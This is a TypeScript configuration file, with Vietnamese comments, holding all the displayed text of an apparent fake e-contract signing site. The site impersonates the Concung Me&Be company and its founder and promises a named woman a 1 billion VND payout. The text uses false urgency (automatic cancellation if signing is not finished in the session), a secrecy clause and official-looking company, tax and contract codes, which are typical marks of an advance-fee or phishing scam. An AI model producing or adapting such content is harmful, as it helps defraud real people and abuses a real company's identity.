
import { ContractData } from './types';

/**
 * 🏆 MASTER CONFIGURATION CENTER - CONCUNG ME&BE EDITION
 * File này chứa toàn bộ nội dung hiển thị trong ứng dụng.
 * Bạn chỉ cần chỉnh sửa các giá trị ở đây để cập nhật toàn bộ trang web.
 */

export const MASTER_CONFIG: ContractData = {
  // ==========================================
  // 1. THÔNG TIN ĐỊNH DANH CHÍNH
  // ==========================================
  "recipientName": "Bà DOÃN THỊ HƯỜNG",
  "amount": "1.000.000.000 VNĐ",
  "senderName": "LƯU ANH TIẾN",
  "senderTitle": "NGƯỜI SÁNG LẬP",
  "companyName": "CTY TNHH CONCUNG ME&BE",
  "companyAddress": "101-103 Trần Quang Khải, Phường Tân Định, Quận 1, TP. Hồ Chí Minh",
  "taxCode": "0311547798",
  "contractCode": "CC-2024/HĐĐT-DH01",
  
  // ==========================================
  // 2. HÌNH ẢNH HỆ THỐNG (CON DẤU & CHỮ KÝ CÓ SẴN)
  // ==========================================
  // Bạn có thể dán link ảnh hoặc mã Base64 vào đây. 
  // Đã xóa link cũ bị lỗi "image not found".
  "senderStampUrl": "", 
  "recipientSignatureUrl": "", // Để trống nếu muốn khách hàng tự ký trực tiếp

  // ==========================================
  // 3. NỘI DUNG TRANG CHÀO (WELCOME VIEW)
  // ==========================================
  "welcomeTitle": "Cổng Ký Kết Hợp Đồng Điện Tử",
  "welcomeSubtitle": "Chào mừng quý khách đến với hệ thống xác thực giao dịch an toàn. Vui lòng hoàn tất quy trình để nhận lệnh chi trả tài chính.",
  "welcomeButton": "Bắt đầu xác thực ngay",
  
  // ==========================================
  // 4. NỘI DUNG TRANG THÔNG BÁO (NOTICE VIEW)
  // ==========================================
  "noticeHeading": "Thông báo quy định chi trả giao dịch",
  "noticeMainText": "Để thực hiện việc chi trả khoản tiền 1.000.000.000 VNĐ theo đúng quy định pháp luật về giao dịch điện tử, quý khách bắt buộc phải thực hiện ký kết hợp đồng số trực tuyến. Văn bản này có giá trị pháp lý tương đương hợp đồng giấy.",
  "noticeAlertBox": "LƯU Ý QUAN TRỌNG: Hệ thống sẽ tự động hủy lệnh giải ngân nếu quá trình ký kết không được hoàn tất trong phiên làm việc hiện tại.",
  
  // ==========================================
  // 5. NỘI DUNG TRANG THÀNH CÔNG (SUCCESS VIEW)
  // ==========================================
  "successTitle": "Xác Thực Thành Công!",
  "successFeeText": "Hệ thống xác nhận đã nhận đủ chữ ký hợp lệ của các bên. Hồ sơ mã hiệu CC-2024/HĐĐT-DH01 đã được đưa vào luồng ưu tiên giải ngân.",
  "successAmountNote": "Giá trị giải ngân thực tế",
  "successTransactionPrefix": "CONCUNG-PAY-SECURE-ID",
  "successSignatureLabel": "DỮ LIỆU CHỮ KÝ ĐIỆN TỬ GHI NHẬN",

  // ==========================================
  // 6. CÁC ĐIỀU KHOẢN HỢP ĐỒNG (CLAUSES)
  // ==========================================
  "clauses": [
    {
      "id": "c1",
      "title": "Điều 1: Mục đích và Phạm vi Giao dịch",
      "content": "Văn bản này nhằm xác nhận việc chi trả khoản tiền hỗ trợ/thanh toán theo thỏa thuận giữa CONCUNG ME&BE và đối tác thụ hưởng. Đây là cơ sở pháp lý duy nhất để ngân hàng thực hiện lệnh chuyển tiền vào tài khoản của Bên B."
    },
    {
      "id": "c2",
      "title": "Điều 2: Giá trị Giải ngân và Hình thức Thanh toán",
      "content": "Giá trị giao dịch được ấn định là 1.000.000.000 VNĐ (Một tỷ đồng chẵn). Khoản tiền này sẽ được chuyển khoản vào số tài khoản đã đăng ký trong vòng 30 phút kể từ khi hệ thống ghi nhận chữ ký điện tử hợp lệ."
    },
    {
      "id": "c3",
      "title": "Điều 3: Cam kết và Bảo mật Thông tin",
      "content": "Các bên cam kết bảo mật tuyệt đối nội dung hợp đồng này. Bên B chịu trách nhiệm về tính xác thực của chữ ký số cá nhân. Mọi tranh chấp phát sinh sẽ được giải quyết dựa trên các quy định về giao dịch điện tử của pháp luật Việt Nam."
    }
  ]
};
